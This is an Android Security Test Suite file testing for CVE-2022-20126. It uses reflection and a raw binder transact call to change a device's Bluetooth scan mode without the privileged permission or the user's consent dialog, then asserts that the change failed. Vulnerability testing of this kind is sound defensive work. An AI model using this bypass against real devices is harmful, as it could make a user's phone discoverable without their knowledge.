/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import static android.Manifest.permission.BLUETOOTH;
import static android.Manifest.permission.BLUETOOTH_SCAN;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;

import static com.android.compatibility.common.util.ShellUtils.runShellCommand;
import static com.android.compatibility.common.util.SystemUtil.runWithShellPermissionIdentity;
import static com.android.sts.common.SystemUtil.poll;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.bluetooth.BluetoothAdapter;
import android.content.AttributionSource;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.Process;
import android.platform.test.annotations.AsbSecurityTest;
import android.service.media.MediaBrowserService;

import androidx.test.runner.AndroidJUnit4;

import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.lang.reflect.Field;
import java.util.List;

@RunWith(AndroidJUnit4.class)
public class CVE_2022_20126 extends StsExtraBusinessLogicTestCase {
    Parcel mData = null, mReply = null;

    @AsbSecurityTest(cveBugId = 203431023)
    @Test
    public void testPocCVE_2022_20126() {
        // Start 'Bluetooth' process
        try (AutoCloseable withBluetoothEnabled = withBluetoothEnabled()) {
            // 'Bluetooth' service takes some time to get enabled
            // Wait until 'Bluetooth' service gets enabled and fetch its instance
            final BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            final Field bluetoothService = BluetoothAdapter.class.getDeclaredField("mService");
            bluetoothService.setAccessible(true);
            assume().withMessage("Unable to get running instance of 'Bluetooth' service")
                    .that(
                            poll(
                                    () -> {
                                        try {
                                            return bluetoothService.get(bluetoothAdapter) != null;
                                        } catch (Exception ignore) {
                                            // Ignore unintended exceptions
                                        }
                                        return false;
                                    }))
                    .isTrue();

            // Create parcels required to invoke the 'transact()' method of 'IBinder'
            mData = Parcel.obtain();
            mReply = Parcel.obtain();
            final IBinder binder = ((IInterface) bluetoothService.get(bluetoothAdapter)).asBinder();
            mData.writeInterfaceToken(binder.getInterfaceDescriptor());
            final int scanMode = getNewScanMode(getCurrentScanMode(bluetoothAdapter));
            mData.writeInt(scanMode /* handle */);
            if (Build.VERSION.SDK_INT < 33 /* TIRAMISU */) {
                mData.writeInt(0 /* timeout */);
            }
            mData.writeTypedObject(
                    new AttributionSource.Builder(Process.myUid()).build(), 0 /* flags */);
            mData.setDataPosition(0 /* position */);

            final Context context = getApplicationContext();
            final Field transactionSetScanModeField =
                    context.createPackageContext(
                                    queryBluetoothPackageName(context),
                                    Context.CONTEXT_IGNORE_SECURITY)
                            .getClassLoader()
                            .loadClass("android.bluetooth.IBluetooth$Stub")
                            .getDeclaredField("TRANSACTION_setScanMode");
            transactionSetScanModeField.setAccessible(true);
            final int transactionCode = transactionSetScanModeField.getInt(null);
            runWithShellPermissionIdentity(
                    () -> {
                        binder.transact(transactionCode /* code */, mData, mReply, 0 /* flags */);
                    },
                    BLUETOOTH,
                    BLUETOOTH_SCAN);

            // Without fix, bluetooth scanMode is set without 'BLUETOOTH_PRIVILEGED' permission
            assertWithMessage(
                            "Device is vulnerable to b/203431023 !! App can set Scan Mode of"
                                    + " device's Bluetooth without showing system dialog to user")
                    .that(getCurrentScanMode(bluetoothAdapter))
                    .isNotEqualTo(scanMode);
        } catch (Exception e) {
            assume().that(e).isNull();
        } finally {
            try {
                // Put a parcel object back into the pool
                mData.recycle();
                mReply.recycle();
            } catch (Exception ignore) {
                // Ignore unintended exceptions
            }
        }
    }

    private AutoCloseable withBluetoothEnabled() {
        // Check if 'Bluetooth' is already enabled
        if (runShellCommand("settings get global bluetooth_on").contains("1")) {
            return () -> {};
        }

        // Enable 'Bluetooth'
        runShellCommand("svc bluetooth enable");

        // Return AutoCloseable to disable 'Bluetooth'
        return () -> runShellCommand("svc bluetooth disable");
    }

    private int getCurrentScanMode(BluetoothAdapter bluetoothAdapter) {
        return runWithShellPermissionIdentity(
                () -> bluetoothAdapter.getScanMode(), BLUETOOTH, BLUETOOTH_SCAN);
    }

    private int getNewScanMode(int currentScanMode) {
        switch (currentScanMode) {
            case BluetoothAdapter.SCAN_MODE_NONE:
                return BluetoothAdapter.SCAN_MODE_CONNECTABLE;
            case BluetoothAdapter.SCAN_MODE_CONNECTABLE:
                return BluetoothAdapter.SCAN_MODE_CONNECTABLE_DISCOVERABLE;
            case BluetoothAdapter.SCAN_MODE_CONNECTABLE_DISCOVERABLE:
                return BluetoothAdapter.SCAN_MODE_CONNECTABLE;
            default:
                throw new IllegalStateException(
                        "Invalid 'ScanMode' is fetched from 'BluetoothAdapter#getScanMode()' !!");
        }
    }

    private String queryBluetoothPackageName(Context context) {
        final List<ResolveInfo> resolveInfos =
                context.getPackageManager()
                        .queryIntentServices(
                                new Intent(MediaBrowserService.SERVICE_INTERFACE), 0 /* flags */);
        return resolveInfos.stream()
                .map(resolveInfo -> resolveInfo.serviceInfo)
                .map(serviceInfo -> serviceInfo.packageName)
                .filter(packageName -> packageName.contains("bluetooth"))
                .findFirst()
                .orElse("com.android.bluetooth");
    }
}
